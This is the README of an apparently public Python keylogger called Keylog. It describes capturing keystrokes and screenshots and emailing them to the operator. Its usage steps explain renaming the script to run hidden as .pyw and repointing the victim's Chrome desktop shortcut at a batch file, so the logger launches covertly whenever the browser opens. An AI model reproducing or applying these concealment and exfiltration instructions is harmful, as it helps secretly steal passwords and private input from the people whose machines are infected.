# Keylog - A python based Keylogger

Introduction:
--------------
Keylog is created in python 2.7 with famous modules like pyHook and pythoncom. Kelog allow the user to listen to the keyboard events. Keylog grab data by using keyboard events which then sent the data along with screenshots. Which are taken when the user press <Enter> or When the data is saved to the local directory called keystrokes.txt


Installation:
------------------
$ git clone https://github.com/farasatkhan/Keylog.git


Usage:
------------------
You would need to add your credentials where necessary. You would be asked to provide two separate emails. One in the host computer which sent the data to the other email (Your email).


### Example:

```
 	   USER = 'yourFirstEmail@gmail.com'
 	   PASS = 'passw0rd'
 	   FROM = USER
 	   TO = 'yourSecondEmail@gmail.com'
```

Optional: You can also attach the file with the chrome.exe file.

Step 1:
Open the run.bat file in your Text editor. Add the location of the main.pyw (You need to change main.py to main.pyw So program runs in the background) file and If you are using chrome 64 bit you might also have to changed the chrome location.

Step 2:
Go to the properties of chrome icon in the desktop and change the Target to run the run.bat file. It will launch main.pyw file as well as chrome.exe.

Authors:
------------------
  Farasatkhan farasatkahan@gmail.com, Pakistan

License:
------------------

	
```
MIT License

	Copyright (c) 2017 Farasat Khan
	

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:
	

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.
	

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

```
